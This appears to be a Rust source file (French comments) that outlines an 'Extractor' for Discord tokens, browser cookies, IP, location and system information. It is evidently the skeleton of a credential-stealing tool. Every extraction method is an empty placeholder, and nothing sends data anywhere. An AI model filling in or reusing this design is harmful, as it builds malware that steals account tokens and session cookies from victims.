use regex::Regex;
use std::path::Path;
use std::fs;
use serde::{Deserialize, Serialize};

pub struct Extractor {
    // Configuration de l'extracteur
}

#[derive(Serialize, Deserialize, Default)]
pub struct ExtractedData {
    ip: String,
    location: String,
    tokens: Vec<String>,
    system_info: SystemInfo,
    timestamp: u64,
    #[serde(default)]
    browser_cookies: Vec<BrowserCookie>,
}

#[derive(Serialize, Deserialize, Default)]
struct BrowserCookie {
    domain: String,
    name: String,
    value: String,
    path: String,
    expires: u64,
}

#[derive(Serialize, Deserialize, Default)]
pub struct SystemInfo {
  os: String,
  cpu: String,
  ram: String,
}


impl Extractor {
    pub fn new() -> Self {
        Extractor {}
    }

    pub fn extract_discord_tokens(&self) -> Vec<String> {
        // Placeholder
        Vec::new()
    }

    pub fn extract_browser_data(&self) -> Vec<BrowserCookie> {
        // Placeholder
        Vec::new()
    }

    fn find_discord_storage_location(&self) -> Option<String> {
        // Placeholder
        None
    }
}
